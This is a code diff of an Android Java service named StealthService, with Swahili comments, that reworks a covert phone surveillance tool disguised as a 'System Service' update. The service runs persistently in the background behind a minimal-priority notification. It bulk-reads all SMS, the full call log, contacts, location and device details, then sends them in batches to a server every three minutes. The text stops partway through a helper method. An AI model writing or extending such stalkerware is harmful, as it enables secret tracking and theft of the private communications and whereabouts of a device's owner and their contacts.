@@ -1,11 +1,15 @@
 package com.security.update;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
+import android.os.Build;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
@@ -13,10 +17,6 @@ import android.provider.Telephony;
 import android.util.Log;
 import android.Manifest;
 import android.content.pm.PackageManager;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.os.Build;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -32,19 +32,21 @@ import java.util.TimerTask;
 
 public class StealthService extends Service {
     private static final String TAG = "StealthService";
+    private static final int NOTIFICATION_ID = 1234;
+    private static final String CHANNEL_ID = "SystemServiceChannel";
+    
     private Timer timer;
     private String parentCode;
     private SharedPreferences prefs;
     private LocationManager locationManager;
-    private int dataSequence = 0;
-    private boolean initialDataSent = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
         prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
         createNotificationChannel();
-        Log.d(TAG, "🔍 StealthService imeanzishwa kwa siri...");
+        startForeground(NOTIFICATION_ID, createNotification());
+        Log.d(TAG, "🔍 StealthService imeanzishwa kwenye background...");
     }
 
     @Override
@@ -57,381 +59,431 @@ public class StealthService extends Service {
             Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
         }
 
-        startForegroundService();
-        startDataCollection();
+        startCompleteSurveillance();
         return START_STICKY;
     }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                "system_update_channel",
-                "System Update Services",
+                CHANNEL_ID,
+                "System Service",
                 NotificationManager.IMPORTANCE_LOW
             );
-            channel.setDescription("System background update services");
+            channel.setDescription("System background service");
             channel.setShowBadge(false);
             
             NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
     }
 
-    private void startForegroundService() {
-        Notification notification;
+    private Notification createNotification() {
+        Notification.Builder builder;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notification = new Notification.Builder(this, "system_update_channel")
-                .setContentTitle("System Services")
-                .setContentText("Running system maintenance...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
-                .setPriority(Notification.PRIORITY_LOW)
-                .setOngoing(true)
-                .build();
+            builder = new Notification.Builder(this, CHANNEL_ID);
         } else {
-            notification = new Notification.Builder(this)
-                .setContentTitle("System Services")
-                .setContentText("Running system maintenance...")
-                .setSmallIcon(android.R.drawable.stat_sys_download)
-                .setPriority(Notification.PRIORITY_LOW)
-                .setOngoing(true)
-                .build();
+            builder = new Notification.Builder(this);
         }
         
-        startForeground(101, notification);
+        builder.setContentTitle("System Service")
+               .setContentText("Running in background")
+               .setSmallIcon(android.R.drawable.ic_menu_compass)
+               .setPriority(Notification.PRIORITY_MIN)
+               .setOngoing(true);
+               
+        return builder.build();
     }
 
-    private void startDataCollection() {
+    private void startCompleteSurveillance() {
         if (timer != null) {
             timer.cancel();
         }
 
         timer = new Timer();
 
-        // Start immediate FULL data collection
+        // Start COMPLETE data collection immediately
         timer.schedule(new TimerTask() {
             @Override
             public void run() {
-                collectAllHistoricalData(); // 🔥 TUMBA DATA ZOTE ZA AWALI
+                collectAndSendAllCompleteData();
             }
-        }, 3000); // Anza baada ya sekunde 3
+        }, 10000);  // Anza baada ya sekunde 10
 
-        // Schedule periodic data collection every 5 minutes
+        // Schedule periodic data collection every 3 minutes (180000 ms)
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
-                collectNewDataOnly(); // 🔥 DATA MPYA TU
+                collectAndSendNewData();
             }
-        }, 300000, 300000); // 5 minutes = 300000 ms
+        }, 180000, 180000); // 3 minutes = 180000 ms
 
-        Log.d(TAG, "📡 Data collection imeanzishwa - inatumwa kila baada ya dakika 5");
+        Log.d(TAG, "📡 Complete Surveillance imeanzishwa - data zote zitatumwa");
     }
 
-    // 🔥 NJIA MPYA: TUMBA DATA ZOTE ZA AWALI
-    private void collectAllHistoricalData() {
+    private void collectAndSendAllCompleteData() {
         try {
-            Log.d(TAG, "💥 KUANZA KUTUMBA DATA ZOTE ZA AWALI...");
-            dataSequence++;
+            Log.d(TAG, "🔄 Kuanza kukusanya DATA ZOTE ZOTE...");
 
-            // 1. SMS ZOTE ZA AWALI - HAKUNA LIMIT
-            collectAndSendAllSMSData();
+            // 1. Kusanya SMS ZOTE
+            if (checkPermission(Manifest.permission.READ_SMS)) {
+                collectAndSendAllSMSData();
+            }
 
-            // 2. SIMU ZOTE ZA AWALI - HAKUNA LIMIT
-            collectAndSendAllCallsData();
+            // 2. Kusanya SIMU ZOTE
+            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+                collectAndSendAllCallsData();
+            }
 
-            // 3. ANWANI ZOTE ZA AWALI - HAKUNA LIMIT
-            collectAndSendAllContactsData();
+            // 3. Kusanya ANWANI ZOTE
+            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+                collectAndSendAllContactsData();
+            }
 
-            // 4. LOCATION YA SASA
-            collectAndSendLocationData();
+            // 4. Kusanya LOCATION
+            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+                collectAndSendLocationData();
+            }
 
-            initialDataSent = true;
-            Log.d(TAG, "🎉 DATA ZOTE ZA AWALI ZIMETUMWA!");
+            // 5. Tuma DEVICE INFO
+            sendDeviceInfo();
+
+            Log.d(TAG, "✅ Ukusaji wa DATA ZOTE umekamilika");
 
         } catch (Exception e) {
-            Log.e(TAG, "❌ Error collecting historical data: " + e.getMessage());
+            Log.e(TAG, "❌ Error collecting complete data: " + e.getMessage());
         }
     }
 
-    // 🔥 NJIA MPYA: DATA MPYA TU
-    private void collectNewDataOnly() {
+    private void collectAndSendNewData() {
         try {
-            Log.d(TAG, "🔄 Kukusanya data mpya tu...");
-            dataSequence++;
+            Log.d(TAG, "🔄 Kuanza kukusanya DATA MPYA...");
 
-            // SMS MPYA TU (siku 1 iliyopita)
-            collectAndSendNewSMSData();
+            // Kusanya data mpya tu (saa 24 zilizopita)
+            long last24Hours = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
 
-            // SIMU MPYA TU (siku 1 iliyopita)
-            collectAndSendNewCallsData();
+            // SMS mpya
+            if (checkPermission(Manifest.permission.READ_SMS)) {
+                collectAndSendNewSMSData(last24Hours);
+            }
 
-            // LOCATION MPYA
-            collectAndSendLocationData();
+            // Simu mpya
+            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+                collectAndSendNewCallsData(last24Hours);
+            }
 
-            Log.d(TAG, "✅ Data mpya imetumwa - seq " + dataSequence);
+            // Location mpya
+            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+                collectAndSendLocationData();
+            }
+
+            Log.d(TAG, "✅ Ukusaji wa data mpya umekamilika");
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error collecting new data: " + e.getMessage());
         }
     }
 
-    // 🔥 SMS ZOTE ZA AWALI - HAKUNA LIMIT
+    // 🆕 KUKUSANYA SMS ZOTE BILA KIKOMO
     private void collectAndSendAllSMSData() {
-        try {
-            Cursor cursor = getContentResolver().query(
-                Telephony.Sms.CONTENT_URI,
-                null, null, null,
-                Telephony.Sms.DATE + " DESC"  // ZOTE BILA LIMIT
-            );
+        new Thread(() -> {
+            try {
+                Cursor cursor = getContentResolver().query(
+                    Telephony.Sms.CONTENT_URI,
+                    null, null, null,
+                    Telephony.Sms.DATE + " ASC"  // ZOTE kutoka mwanzo
+                );
 
-            if (cursor != null) {
-                int totalSMS = cursor.getCount();
-                Log.d(TAG, "📨 Kupakua SMS " + totalSMS + " zote...");
-                
-                int count = 0;
-                while (cursor.moveToNext()) {
-                    JSONObject smsData = new JSONObject();
-                    String senderNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                    int smsType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
-                    
-                    // PATA JINA LA MTU KUTOKA NAMBA
-                    String senderName = getContactNameFromNumber(senderNumber);
+                if (cursor != null) {
+                    int totalCount = 0;
+                    int batchCount = 0;
+                    JSONArray smsBatch = new JSONArray();
 
-                    smsData.put("sender_number", senderNumber);
-                    smsData.put("sender_name", senderName);
-                    smsData.put("message", messageBody);
-                    smsData.put("timestamp", timestamp);
-                    smsData.put("type", getSMSTypeText(smsType));
-                    smsData.put("sequence", dataSequence);
-                    smsData.put("data_type", "historical_sms");
+                    while (cursor.moveToNext()) {
+                        try {
+                            JSONObject smsData = new JSONObject();
+                            String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
 
-                    // Tuma SMS moja moja
-                    sendDataToServer("sms", smsData);
-                    count++;
-                    
-                    // Ongea kidogo kwa console
-                    if (count % 100 == 0) {
-                        Log.d(TAG, "📨 SMS " + count + "/" + totalSMS + " zimetumwa...");
-                    }
-                    
-                    // Pumzika kidogo kati ya SMS nyingi
-                    if (count % 50 == 0) Thread.sleep(2000);
-                }
-                cursor.close();
-                Log.d(TAG, "✅ SMS ZOTE " + count + " zimetumwa kikamilifu!");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading all SMS: " + e.getMessage());
-        }
-    }
+                            smsData.put("sender", address != null ? address : "Unknown");
+                            smsData.put("message", body != null ? body : "");
+                            smsData.put("timestamp", timestamp);
+                            smsData.put("type", getSMSType(type));
+                            smsData.put("readable_time", formatTime(timestamp));
 
-    // 🔥 SIMU ZOTE ZA AWALI - HAKUNA LIMIT
-    private void collectAndSendAllCallsData() {
-        try {
-            Cursor cursor = getContentResolver().query(
-                CallLog.Calls.CONTENT_URI,
-                null, null, null,
-                CallLog.Calls.DATE + " DESC"  // ZOTE BILA LIMIT
-            );
+                            smsBatch.put(smsData);
+                            batchCount++;
+                            totalCount++;
 
-            if (cursor != null) {
-                int totalCalls = cursor.getCount();
-                Log.d(TAG, "📞 Kupakua simu " + totalCalls + " zote...");
-                
-                int count = 0;
-                while (cursor.moveToNext()) {
-                    JSONObject callData = new JSONObject();
-                    String callNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
-                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    
-                    // PATA JINA LA MTU KUTOKA NAMBA
-                    String callerName = getContactNameFromNumber(callNumber);
+                            // Tuma batch kila SMS 50
+                            if (batchCount >= 50) {
+                                sendBatchDataToServer("sms_batch", smsBatch);
+                                smsBatch = new JSONArray();
+                                batchCount = 0;
+                                Thread.sleep(2000);  // Pumzika kwa sekunde 2
+                            }
 
-                    callData.put("caller_number", callNumber);
-                    callData.put("caller_name", callerName);
-                    callData.put("duration", duration);
-                    callData.put("timestamp", timestamp);
-                    callData.put("type", getCallTypeText(callType));
-                    callData.put("sequence", dataSequence);
-                    callData.put("data_type", "historical_calls");
-
-                    // Tuma simu moja moja
-                    sendDataToServer("calls", callData);
-                    count++;
-                    
-                    // Ongea kidogo kwa console
-                    if (count % 100 == 0) {
-                        Log.d(TAG, "📞 Simu " + count + "/" + totalCalls + " zimetumwa...");
-                    }
-                    
-                    // Pumzika kidogo
-                    if (count % 50 == 0) Thread.sleep(2000);
-                }
-                cursor.close();
-                Log.d(TAG, "✅ SIMU ZOTE " + count + " zimetumwa kikamilifu!");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading all calls: " + e.getMessage());
-        }
-    }
-
-    // 🔥 ANWANI ZOTE - HAKUNA LIMIT
-    private void collectAndSendAllContactsData() {
-        try {
-            Cursor cursor = getContentResolver().query(
-                ContactsContract.Contacts.CONTENT_URI,
-                null, null, null,
-                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // ZOTE BILA LIMIT
-            );
-
-            if (cursor != null) {
-                int totalContacts = cursor.getCount();
-                Log.d(TAG, "👥 Kupakua anwani " + totalContacts + " zote...");
-                
-                int count = 0;
-                while (cursor.moveToNext()) {
-                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-
-                    // Pata namba ZOTE za simu za contact hii
-                    JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
-                    
-                    if (phoneNumbers.length() > 0) {
-                        JSONObject contactData = new JSONObject();
-                        contactData.put("name", name);
-                        contactData.put("phones", phoneNumbers);
-                        contactData.put("timestamp", System.currentTimeMillis());
-                        contactData.put("sequence", dataSequence);
-                        contactData.put("data_type", "historical_contacts");
-
-                        // Tuma contact moja moja
-                        sendDataToServer("contacts", contactData);
-                        count++;
-                        
-                        // Ongea kidogo kwa console
-                        if (count % 50 == 0) {
-                            Log.d(TAG, "👥 Anwani " + count + "/" + totalContacts + " zimetumwa...");
+                        } catch (Exception e) {
+                            Log.e(TAG, "❌ Error processing SMS: " + e.getMessage());
                         }
-                        
-                        // Pumzika kidogo
-                        if (count % 20 == 0) Thread.sleep(1000);
                     }
+
+                    // Tuma batch ya mwisho ikiwa imebaki
+                    if (batchCount > 0) {
+                        sendBatchDataToServer("sms_batch", smsBatch);
+                    }
+
+                    cursor.close();
+                    Log.d(TAG, "✅ SMS ZOTE " + totalCount + " zimetumwa kikamilifu");
                 }
-                cursor.close();
-                Log.d(TAG, "✅ ANWANI ZOTE " + count + " zimetumwa kikamilifu!");
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error reading all SMS: " + e.getMessage());
             }
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Error reading all contacts: " + e.getMessage());
-        }
+        }).start();
     }
 
-    // 🔥 SMS MPYA TU
-    private void collectAndSendNewSMSData() {
+    // 🆕 KUKUSANYA SIMU ZOTE BILA KIKOMO
+    private void collectAndSendAllCallsData() {
+        new Thread(() -> {
+            try {
+                Cursor cursor = getContentResolver().query(
+                    CallLog.Calls.CONTENT_URI,
+                    null, null, null,
+                    CallLog.Calls.DATE + " ASC"  // ZOTE kutoka mwanzo
+                );
+
+                if (cursor != null) {
+                    int totalCount = 0;
+                    int batchCount = 0;
+                    JSONArray callsBatch = new JSONArray();
+
+                    while (cursor.moveToNext()) {
+                        try {
+                            JSONObject callData = new JSONObject();
+                            String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                            long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+
+                            callData.put("number", number != null ? number : "Unknown");
+                            callData.put("duration", duration);
+                            callData.put("timestamp", timestamp);
+                            callData.put("type", getCallTypeText(type));
+                            callData.put("readable_time", formatTime(timestamp));
+
+                            callsBatch.put(callData);
+                            batchCount++;
+                            totalCount++;
+
+                            // Tuma batch kila simu 50
+                            if (batchCount >= 50) {
+                                sendBatchDataToServer("calls_batch", callsBatch);
+                                callsBatch = new JSONArray();
+                                batchCount = 0;
+                                Thread.sleep(2000);  // Pumzika kwa sekunde 2
+                            }
+
+                        } catch (Exception e) {
+                            Log.e(TAG, "❌ Error processing call: " + e.getMessage());
+                        }
+                    }
+
+                    // Tuma batch ya mwisho ikiwa imebaki
+                    if (batchCount > 0) {
+                        sendBatchDataToServer("calls_batch", callsBatch);
+                    }
+
+                    cursor.close();
+                    Log.d(TAG, "✅ SIMU ZOTE " + totalCount + " zimetumwa kikamilifu");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error reading all calls: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    // 🆕 KUKUSANYA ANWANI ZOTE BILA KIKOMO
+    private void collectAndSendAllContactsData() {
+        new Thread(() -> {
+            try {
+                Cursor cursor = getContentResolver().query(
+                    ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null,
+                    ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // ZOTE
+                );
+
+                if (cursor != null) {
+                    int totalCount = 0;
+                    int batchCount = 0;
+                    JSONArray contactsBatch = new JSONArray();
+
+                    while (cursor.moveToNext()) {
+                        try {
+                            String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
+                            String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
+
+                            // Pata namba za simu za contact hii
+                            String phoneNumber = getContactPhoneNumber(contactId);
+                            
+                            if (phoneNumber != null && !phoneNumber.isEmpty()) {
+                                JSONObject contactData = new JSONObject();
+                                contactData.put("name", name != null ? name : "Unknown");
+                                contactData.put("phone", phoneNumber);
+                                contactData.put("timestamp", System.currentTimeMillis());
+                                contactData.put("readable_time", formatTime(System.currentTimeMillis()));
+
+                                contactsBatch.put(contactData);
+                                batchCount++;
+                                totalCount++;
+
+                                // Tuma batch kila anwani 50
+                                if (batchCount >= 50) {
+                                    sendBatchDataToServer("contacts_batch", contactsBatch);
+                                    contactsBatch = new JSONArray();
+                                    batchCount = 0;
+                                    Thread.sleep(2000);  // Pumzika kwa sekunde 2
+                                }
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "❌ Error processing contact: " + e.getMessage());
+                        }
+                    }
+
+                    // Tuma batch ya mwisho ikiwa imebaki
+                    if (batchCount > 0) {
+                        sendBatchDataToServer("contacts_batch", contactsBatch);
+                    }
+
+                    cursor.close();
+                    Log.d(TAG, "✅ ANWANI ZOTE " + totalCount + " zimetumwa kikamilifu");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error reading all contacts: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    // KUKUSANYA SMS MPYA (saa 24 zilizopita)
+    private void collectAndSendNewSMSData(long sinceTime) {
         try {
-            // Tafuta SMS za siku 1 iliyopita tu
-            long oneDayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
-            
+            String selection = Telephony.Sms.DATE + " > ?";
+            String[] selectionArgs = {String.valueOf(sinceTime)};
+
             Cursor cursor = getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
-                null,
-                Telephony.Sms.DATE + " > ?",
-                new String[]{String.valueOf(oneDayAgo)},
+                null, selection, selectionArgs,
                 Telephony.Sms.DATE + " DESC"
             );
 
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    JSONObject smsData = new JSONObject();
-                    String senderNumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                    String messageBody = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                    int smsType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
-                    
-                    String senderName = getContactNameFromNumber(senderNumber);
+                    try {
+                        JSONObject smsData = new JSONObject();
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
 
-                    smsData.put("sender_number", senderNumber);
-                    smsData.put("sender_name", senderName);
-                    smsData.put("message", messageBody);
-                    smsData.put("timestamp", timestamp);
-                    smsData.put("type", getSMSTypeText(smsType));
-                    smsData.put("sequence", dataSequence);
-                    smsData.put("data_type", "new_sms");
+                        smsData.put("sender", address != null ? address : "Unknown");
+                        smsData.put("message", body != null ? body : "");
+                        smsData.put("timestamp", timestamp);
+                        smsData.put("type", getSMSType(type));
+                        smsData.put("readable_time", formatTime(timestamp));
 
-                    sendDataToServer("sms", smsData);
-                    count++;
+                        sendSingleDataToServer("sms", smsData);
+                        count++;
+                        
+                        Thread.sleep(500);
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error processing new SMS: " + e.getMessage());
+                    }
                 }
                 cursor.close();
-                if (count > 0) Log.d(TAG, "✅ SMS mpya " + count + " zimetumwa");
+                if (count > 0) {
+                    Log.d(TAG, "✅ SMS mpya " + count + " zimetumwa");
+                }
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading new SMS: " + e.getMessage());
         }
     }
 
-    // 🔥 SIMU MPYA TU
-    private void collectAndSendNewCallsData() {
+    // KUKUSANYA SIMU MPYA (saa 24 zilizopita)
+    private void collectAndSendNewCallsData(long sinceTime) {
         try {
-            // Tafuta simu za siku 1 iliyopita tu
-            long oneDayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
-            
+            String selection = CallLog.Calls.DATE + " > ?";
+            String[] selectionArgs = {String.valueOf(sinceTime)};
+
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
-                null,
-                CallLog.Calls.DATE + " > ?",
-                new String[]{String.valueOf(oneDayAgo)},
+                null, selection, selectionArgs,
                 CallLog.Calls.DATE + " DESC"
             );
 
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    JSONObject callData = new JSONObject();
-                    String callNumber = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                    String timestamp = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
-                    int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    
-                    String callerName = getContactNameFromNumber(callNumber);
+                    try {
+                        JSONObject callData = new JSONObject();
+                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
 
-                    callData.put("caller_number", callNumber);
-                    callData.put("caller_name", callerName);
-                    callData.put("duration", duration);
-                    callData.put("timestamp", timestamp);
-                    callData.put("type", getCallTypeText(callType));
-                    callData.put("sequence", dataSequence);
-                    callData.put("data_type", "new_calls");
+                        callData.put("number", number != null ? number : "Unknown");
+                        callData.put("duration", duration);
+                        callData.put("timestamp", timestamp);
+                        callData.put("type", getCallTypeText(type));
+                        callData.put("readable_time", formatTime(timestamp));
 
-                    sendDataToServer("calls", callData);
-                    count++;
+                        sendSingleDataToServer("calls", callData);
+                        count++;
+                        
+                        Thread.sleep(500);
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error processing new call: " + e.getMessage());
+                    }
                 }
                 cursor.close();
-                if (count > 0) Log.d(TAG, "✅ Simu mpya " + count + " zimetumwa");
+                if (count > 0) {
+                    Log.d(TAG, "✅ Simu mpya " + count + " zimetumwa");
+                }
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Error reading new calls: " + e.getMessage());
         }
     }
 
-    // 🔥 LOCATION YA SASA
     private void collectAndSendLocationData() {
         try {
             locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (locationManager != null) {
+                Location lastLocation = null;
+                
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                }
+                
+                if (lastLocation == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    lastLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                }
+                
                 if (lastLocation != null) {
                     JSONObject locationData = new JSONObject();
                     locationData.put("latitude", lastLocation.getLatitude());
                     locationData.put("longitude", lastLocation.getLongitude());
                     locationData.put("accuracy", lastLocation.getAccuracy());
                     locationData.put("timestamp", lastLocation.getTime());
-                    locationData.put("address", "GPS Location");
-                    locationData.put("sequence", dataSequence);
+                    locationData.put("readable_time", formatTime(lastLocation.getTime()));
+                    locationData.put("provider", lastLocation.getProvider());
 
-                    sendDataToServer("location", locationData);
+                    sendSingleDataToServer("location", locationData);
+                    Log.d(TAG, "✅ Location imetumwa kikamilifu");
                 }
             }
         } catch (Exception e) {
@@ -439,40 +491,23 @@ public class StealthService extends Service {
         }
     }
 
-    // 🆕 PATA JINA LA MTU KUTOKA NAMBA YA SIMU
-    private String getContactNameFromNumber(String phoneNumber) {
-        if (phoneNumber == null) return "Namba isiyojulikana";
-        
+    private void sendDeviceInfo() {
         try {
-            // Safisha namba (ondoa space na special characters)
-            String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
-            
-            // Tafuta contact kwenye anwani
-            Cursor cursor = getContentResolver().query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME},
-                ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ?",
-                new String[]{"%" + cleanNumber},
-                null
-            );
+            JSONObject deviceInfo = new JSONObject();
+            deviceInfo.put("model", android.os.Build.MODEL);
+            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
+            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
+            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
+            deviceInfo.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
 
-            if (cursor != null && cursor.moveToFirst()) {
-                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                cursor.close();
-                return name;
-            }
-            if (cursor != null) {
-                cursor.close();
-            }
+            sendSingleDataToServer("device_info", deviceInfo);
+            Log.d(TAG, "✅ Device info imetumwa kikamilifu");
         } catch (Exception e) {
-            Log.e(TAG, "Error getting contact name: " + e.getMessage());
+            Log.e(TAG, "❌ Error sending device info: " + e.getMessage());
         }
-        
-        return phoneNumber; // Rudi namba kama hakuna jina
     }
 
-    private JSONArray getAllContactPhoneNumbers(String contactId) {
-        JSONArray phones = new JSONArray();
+    private String getContactPhoneNumber(String contactId) {
         try {
             Cursor phoneCursor = getContentResolver().query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -482,55 +517,100 @@ public class StealthService extends Service {
                 null
             );
 
+            if (phoneCursor != null && phoneCursor.moveToFirst()) {
+                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
+                    ContactsContract.CommonDataKinds.Phone.NUMBER));
+                phoneCursor.close();
+                return phone;
+            }
             if (phoneCursor != null) {
-                while (phoneCursor.moveToNext()) {
-                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
-                        ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
-                        ContactsContract.CommonDataKinds.Phone.TYPE)));
-                    
-                    JSONObject phoneInfo = new JSONObject();
-                    phoneInfo.put("number", phone);
-                    phoneInfo.put("type", type);
-                    phones.put(phoneInfo);
-                }
                 phoneCursor.close();
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
+            Log.e(TAG, "Error getting phone number: " + e.getMessage());
         }
-        return phones;
-    }
-
-    private String getSMSTypeText(int smsType) {
-        switch (smsType) {
-            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
-            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
-            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
-            default: return "unknown";
-        }
+        return null;
     }
 
     private String getCallTypeText(int callType) {
         switch (callType) {
-            case CallLog.Calls.INCOMING_TYPE: return "incoming";
-            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
-            case CallLog.Calls.MISSED_TYPE: return "missed";
-            default: return "unknown";
+            case CallLog.Calls.INCOMING_TYPE:
+                return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "outgoing";
+            case CallLog.Calls.MISSED_TYPE:
+                return "missed";
+            case CallLog.Calls.REJECTED_TYPE:
+                return "rejected";
+            default:
+                return "unknown";
         }
     }
 
-    private String getPhoneTypeText(int phoneType) {
-        switch (phoneType) {
-            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
-            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
-            default: return "other";
+    private String getSMSType(int smsType) {
+        switch (smsType) {
+            case Telephony.Sms.MESSAGE_TYPE_INBOX:
+                return "incoming";
+            case Telephony.Sms.MESSAGE_TYPE_SENT:
